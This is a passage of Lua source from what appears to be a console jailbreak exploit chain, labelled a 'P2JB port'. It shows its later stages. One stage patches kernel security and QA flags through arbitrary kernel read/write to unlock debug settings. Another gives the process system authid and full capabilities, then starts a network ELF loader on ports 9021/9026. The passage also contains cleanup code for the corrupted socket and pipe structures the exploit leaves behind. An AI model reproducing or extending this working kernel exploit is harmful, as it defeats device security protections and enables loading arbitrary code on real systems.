        if not kernel_offset.DATA_BASE_UTOKEN_FLAGS then return false, "DATA_BASE_UTOKEN_FLAGS missing" end

        local security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS
        local target_id_addr      = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID
        local qa_flags_addr       = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS
        local utoken_flags_addr   = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS

        klog("[6] debug patch accessor=" .. tostring(label))
        klog("[6] security_flags_addr=" .. stage_hex(security_flags_addr))
        klog("[6] target_id_addr=" .. stage_hex(target_id_addr))
        klog("[6] qa_flags_addr=" .. stage_hex(qa_flags_addr))
        klog("[6] utoken_flags_addr=" .. stage_hex(utoken_flags_addr))

        local sf = accessor.read_dword(security_flags_addr)
        accessor.write_dword(security_flags_addr, bit64.bor(sf, 0x14))

        accessor.write_byte(target_id_addr, 0x82)

        local qa = accessor.read_dword(qa_flags_addr)
        accessor.write_dword(qa_flags_addr, bit64.bor(qa, 0x10300))

        local ut = accessor.read_byte(utoken_flags_addr)
        accessor.write_byte(utoken_flags_addr, bit64.bor(ut, 0x1))

        local sf_after = accessor.read_dword(security_flags_addr)
        local tid_after = accessor.read_byte(target_id_addr)
        local qa_after = accessor.read_dword(qa_flags_addr)
        local ut_after = accessor.read_byte(utoken_flags_addr)

        klog("[6] debug verify sf=" .. stage_hex(sf_after)
            .. " target_id=" .. stage_hex(tid_after)
            .. " qa=" .. stage_hex(qa_after)
            .. " utoken=" .. stage_hex(ut_after))

        local sf_ok = bit32.band(stage_to_num(sf_after), 0x14) == 0x14
        local tid_ok = bit32.band(stage_to_num(tid_after), 0xff) == 0x82
        local qa_ok = bit32.band(stage_to_num(qa_after), 0x10300) == 0x10300
        local ut_ok = bit32.band(stage_to_num(ut_after), 0x1) == 0x1

        if sf_ok and tid_ok and qa_ok and ut_ok then
            klog("[6] debug menu patches verified")
            return true
        end

        return false, "verify failed sf=" .. tostring(sf_ok)
            .. " target=" .. tostring(tid_ok)
            .. " qa=" .. tostring(qa_ok)
            .. " utoken=" .. tostring(ut_ok)
    end

    -- -------------------------------------------------------------------------
    -- Stage 6: GPU Setup + Debug Settings patches
    -- -------------------------------------------------------------------------
    stage_notify("Stage 6\nGPU + Debug Settings patches")
    local stage6_addr_ok, stage6_addr_err = prepare_kernel_addr_for_stage6()
    local gpu_ok = false

    if stage6_addr_ok and type(gpu) == "table" and type(gpu.setup) == "function" then
        if type(find_mod_by_name) == "function" then
            local ok_mod, mod = pcall(find_mod_by_name, "libSceGnmDriverForNeoMode.sprx")
            if ok_mod and mod then
                klog("[6] libSceGnmDriverForNeoMode.sprx handle=" .. tostring(mod.handle)
                    .. " base=" .. stage_hex(mod.base_addr))
            else
                stage_warn(6, "libSceGnmDriverForNeoMode.sprx not found; gpu.setup may fail")
            end
        end

        local ok_setup, setup_err = pcall(gpu.setup)
        if ok_setup then
            gpu_ok = true
            klog("[6] gpu.setup ok")
        else
            stage_warn(6, "gpu.setup failed: " .. tostring(setup_err))
            stage_notify("[6] gpu setup failed (non-fatal)")
        end
    else
        stage_warn(6, "GPU setup requirements missing: " .. tostring(stage6_addr_err or "gpu.setup unavailable"))
        stage_notify("[6] gpu setup skipped (non-fatal)")
    end

    if gpu_ok and type(gpu.read_dword) == "function" then
        local ok_pid, pid = pcall(gpu.read_dword, curproc + OFF.PROC_PID)
        if ok_pid then klog("[6] pid via gpu=" .. tostring(pid)) end
    end

    local debug_ok = false
    local fw_num = tonumber(FW_VERSION) or 0
    local prefer_gpu = fw_num >= 7

    if prefer_gpu and gpu_ok then
        local ok_patch, patch_ret = pcall(apply_debug_menu_patches, gpu, "gpu")
        if ok_patch and patch_ret == true then
            debug_ok = true
        else
            stage_warn(6, "GPU debug patch failed: " .. tostring(patch_ret))
        end
    end

    if not debug_ok and not prefer_gpu then
        local ok_patch, patch_ret = pcall(apply_debug_menu_patches, kernel, "kernel")
        if ok_patch and patch_ret == true then
            debug_ok = true
        else
            stage_warn(6, "kernel debug patch failed: " .. tostring(patch_ret))
        end
    end

    if debug_ok then
        stage_notify("Stage 6\nDebug Settings Enabled")
    else
        stage_notify("Stage 6\nDebug Settings patch failed")
    end

    -- -------------------------------------------------------------------------
    -- Stage 7: ELF Loader
    -- -------------------------------------------------------------------------
    stage_notify("Stage 7\nELF Loader")

    -- set authid and full caps (matches p2jb_luac0re Stage 7)
    kwrite64(proc_ucred + OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID)
    kwrite64(proc_ucred + OFF.UCRED_CR_SCECAPS0,  U64_NEG1)
    kwrite64(proc_ucred + OFF.UCRED_CR_SCECAPS1,  U64_NEG1)
    klog("[7] authid + caps set")

    -- initialize ipv6_kernel_rw: elf_loader:run() requires ipv6_kernel_rw.data.* to be populated
    local irw_ok = false
    if type(ipv6_kernel_rw) == "table" and type(ipv6_kernel_rw.init) == "function" then
        local ok_irw, irw_err = pcall(ipv6_kernel_rw.init, fd_ofiles, kread64, kwrite64)
        if ok_irw then
            irw_ok = true
            kernel.copyout      = ipv6_kernel_rw.copyout
            kernel.copyin       = ipv6_kernel_rw.copyin
            kernel.read_buffer  = ipv6_kernel_rw.read_buffer
            kernel.write_buffer = ipv6_kernel_rw.write_buffer
            klog("[7] ipv6_kernel_rw initialized ok")
        else
            klog("[7] WARNING: ipv6_kernel_rw.init failed: " .. tostring(irw_err))
            stage_warn(7, "ipv6_kernel_rw.init failed: " .. tostring(irw_err))
        end
    else
        klog("[7] WARNING: ipv6_kernel_rw not available")
        stage_warn(7, "ipv6_kernel_rw not available")
    end

    -- persist exploit state for the loader (same pattern as umtx.lua/lapse.lua)
    if irw_ok and type(storage) == "table" and type(storage.set) == "function" then
        local ok_st, st_err = pcall(storage.set, "kernel_rw", {
            ipv6_kernel_rw_data = ipv6_kernel_rw.data,
            kernel_addr         = kernel.addr,
        })
        if ok_st then
            klog("[7] kernel_rw state saved to storage")
        else
            klog("[7] WARNING: storage.set failed: " .. tostring(st_err))
        end
    end

    -- load ELF loader (start_elf_loader from savedata0/elf_loader.lua)
    local elfldr_ok = false
    if irw_ok then
        -- elf_loader.lua is not auto-required by main.lua; load it on demand.
        -- Also provide get_savedata_path, which elf_loader needs but savedata0 never defines.
        if type(rawget(_G, "get_savedata_path")) ~= "function" then
            _G.get_savedata_path = function()
                if is_jailbroken() then
                    return string.format("/mnt/sandbox/%s_000/savedata0/", get_title_id())
                else
                    return "/savedata0/"
                end
            end
            klog("[7] get_savedata_path defined")
        end

        if type(rawget(_G, "start_elf_loader")) ~= "function" then
            -- After jailbreak the sandbox root changes; require()'s /savedata0/ path
            -- no longer resolves. Use dofile() with the full jailbroken path instead.
            local elf_path = _G.get_savedata_path() .. "elf_loader.lua"
            local ok_req, req_err = pcall(dofile, elf_path)
            if ok_req then
                klog("[7] elf_loader.lua loaded ok (" .. elf_path .. ")")
            else
                klog("[7] dofile elf_loader failed: " .. tostring(req_err))
                stage_notify("[7] elf_loader load failed:\n" .. tostring(req_err))
            end
        end

        if type(start_elf_loader) == "function" then
            local ok_elf, elf_err = pcall(start_elf_loader)
            if ok_elf then
                elfldr_ok = true
                klog("[7] ELF loader started ok")
            else
                klog("[7] ELF loader error: " .. tostring(elf_err))
                stage_notify("[7] ELF loader error:\n" .. tostring(elf_err))
            end
        else
            klog("[7] start_elf_loader not available after require")
            stage_notify("[7] start_elf_loader not available")
        end
    end

    -- Restore ipv6_kernel_rw state before process exit to prevent kernel panic?
    -- Fix: zero corrupted kernel pointers, then explicitly close all four FDs while
    -- kwrite is still available. The exploit master/victim pipes are NOT touched here
    -- (their f_count was bumped +0x100 in Stage 3b so pipeclose is never called).
    if irw_ok and type(ipv6_kernel_rw) == "table" and ipv6_kernel_rw.data then
        local d = ipv6_kernel_rw.data
        local so_pcb_off  = (type(kernel_offset) == "table" and kernel_offset.SO_PCB) or 0x18
        local pktopts_off = OFF.INPCB_PKTOPTS

        -- Zero ip6po_pktinfo on both sockets so ip6_freepcbopts skips the free
        local function zero_sock_pktinfo(fd, label)
            if not fd or fd < 0 then return end
            local ok, err = pcall(function()
                local so = ipv6_kernel_rw.get_fd_data_addr(fd)
                if not is_kptr(so) then return end
                local pcb = kread64(so + so_pcb_off)
                if not is_kptr(pcb) then return end
                local pktopts = kread64(pcb + pktopts_off)
                if not is_kptr(pktopts) then return end
                kwrite64(pktopts + 0x10, 0)  -- ip6po_pktinfo = NULL
                klog("[7] " .. label .. " ip6po_pktinfo zeroed")
            end)
            if not ok then
                klog("[7] WARNING: " .. label .. " pktinfo zero failed: " .. tostring(err))
            end
        end

        zero_sock_pktinfo(d.master_sock, "master_sock")
        zero_sock_pktinfo(d.victim_sock, "victim_sock")

        -- Zero pipe_buffer.size/buffer on the read pipe so pipe_free_kmem skips
        if is_kptr(d.pipe_addr) then
            kwrite32(d.pipe_addr + 12, 0)  -- pipe_buffer.size   = 0
            kwrite64(d.pipe_addr + 16, 0)  -- pipe_buffer.buffer = NULL
            klog("[7] ipv6 pipe buffer zeroed")
        end

        -- Explicitly close all four FDs now that kernel state is clean
        local function safe_close(fd, label)
            if fd and fd >= 0 then syscall.close(fd); klog("[7] closed " .. label) end
        end
        safe_close(d.master_sock,   "ipv6_master_sock")
        safe_close(d.victim_sock,   "ipv6_victim_sock")
        safe_close(d.pipe_read_fd,  "ipv6_pipe_read")
        safe_close(d.pipe_write_fd, "ipv6_pipe_write")
        klog("[7] ipv6_kernel_rw cleanup done")
    end

    -- show final dialog with IP info (p2jb_luac0re Stage 7 idea)
    local current_ip = type(get_current_ip) == "function" and get_current_ip()
    if current_ip then
        local lua_str = string.format("%s:%d", current_ip, 9026)
        local elf_str = elfldr_ok and string.format("%s:%d", current_ip, 9021) or "N/A"
        stage_notify(string.format("P2JB Done!\nFW: %s\nLua: %s\nELF: %s",
            tostring(FW_VERSION), lua_str, elf_str))
    else
        stage_notify("P2JB Done!\nDO NOT CLOSE THE GAME!")
    end


end

function main()
    send_ps_notification("P2JB port by maj0r")
    p2jb()
end

main()
